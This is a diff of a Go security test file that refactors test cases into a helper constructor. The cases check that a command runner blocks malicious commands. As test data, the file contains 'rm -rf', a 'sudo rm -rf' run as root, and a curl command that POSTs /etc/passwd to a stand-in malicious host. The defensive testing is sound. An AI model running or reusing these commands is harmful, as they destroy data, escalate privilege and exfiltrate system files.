@@ -264,15 +264,9 @@ func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 	}{
 		{
 			name: "dangerous_rm_command_dry_run_protection",
-			cmd: &runnertypes.RuntimeCommand{
-				Spec: &runnertypes.CommandSpec{
-					Name: "dangerous-rm",
-					Cmd:  "rm",
-					Args: []string{"-rf", "/tmp/should-not-execute-in-test"},
-				},
-				ExpandedCmd:  "rm",
-				ExpandedArgs: []string{"-rf", "/tmp/should-not-execute-in-test"},
-			},
+			cmd: executortesting.CreateRuntimeCommand("rm", []string{"-rf", "/tmp/should-not-execute-in-test"},
+				executortesting.WithName("dangerous-rm"),
+				executortesting.WithExpandedArgs([]string{"-rf", "/tmp/should-not-execute-in-test"})),
 			group: &runnertypes.GroupSpec{
 				Name: "malicious-group",
 			},
@@ -282,16 +276,10 @@ func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 		},
 		{
 			name: "sudo_privilege_escalation_protection",
-			cmd: &runnertypes.RuntimeCommand{
-				Spec: &runnertypes.CommandSpec{
-					Name:      "sudo-escalation",
-					Cmd:       "sudo",
-					Args:      []string{"rm", "-rf", "/tmp/test-sudo-target"},
-					RunAsUser: "root",
-				},
-				ExpandedCmd:  "sudo",
-				ExpandedArgs: []string{"rm", "-rf", "/tmp/test-sudo-target"},
-			},
+			cmd: executortesting.CreateRuntimeCommand("sudo", []string{"rm", "-rf", "/tmp/test-sudo-target"},
+				executortesting.WithName("sudo-escalation"),
+				executortesting.WithRunAsUser("root"),
+				executortesting.WithExpandedArgs([]string{"rm", "-rf", "/tmp/test-sudo-target"})),
 			group: &runnertypes.GroupSpec{
 				Name: "privilege-escalation-group",
 			},
@@ -301,15 +289,9 @@ func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 		},
 		{
 			name: "network_exfiltration_command_protection",
-			cmd: &runnertypes.RuntimeCommand{
-				Spec: &runnertypes.CommandSpec{
-					Name: "data-exfil",
-					Cmd:  "curl",
-					Args: []string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"},
-				},
-				ExpandedCmd:  "curl",
-				ExpandedArgs: []string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"},
-			},
+			cmd: executortesting.CreateRuntimeCommand("curl", []string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"},
+				executortesting.WithName("data-exfil"),
+				executortesting.WithExpandedArgs([]string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"})),
 			group: &runnertypes.GroupSpec{
 				Name: "network-exfil-group",
 			},
